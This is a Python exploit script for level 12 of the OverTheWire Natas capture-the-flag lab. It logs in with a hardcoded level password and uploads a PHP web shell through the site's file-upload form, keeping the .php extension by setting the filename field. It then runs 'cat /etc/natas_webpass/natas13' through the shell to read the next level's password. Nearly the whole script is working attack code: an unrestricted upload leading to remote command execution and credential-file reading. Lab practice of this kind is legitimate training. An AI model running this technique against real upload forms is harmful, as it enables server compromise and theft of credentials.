#!/usr/bin/env python3
import requests
import re

username = 'natas12'
password = 'YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG'
url = 'http://%s.natas.labs.overthewire.org/' % username

with open('natas12.html', 'w+') as out:

    s = requests.Session()
    # filename is uploadedfile;
    # document:'https://docs.python-requests.org/en/latest/user/quickstart/#post-a-multipart-encoded-file';
    files = {'uploadedfile': open('inject.php', 'rb')}

    # r = s.get(url, auth = (username, password))

    r = s.post(url, files={'uploadedfile': open('inject.php', 'rb')}, data={
               'filename': 'inject.php', 'MAX_FILE_SIZE': '1000'}, auth=(username, password))

    content = r.text
    # out.write(content)
    path_uploaded = re.findall('<a href="(.*)">upload/', content)[0]
    res = s.get(url + "/%s?cmd=cat /etc/natas_webpass/natas13" %
                path_uploaded, auth=(username, password))

    content_shell = res.text
    out.write(content_shell)
    print(content_shell)
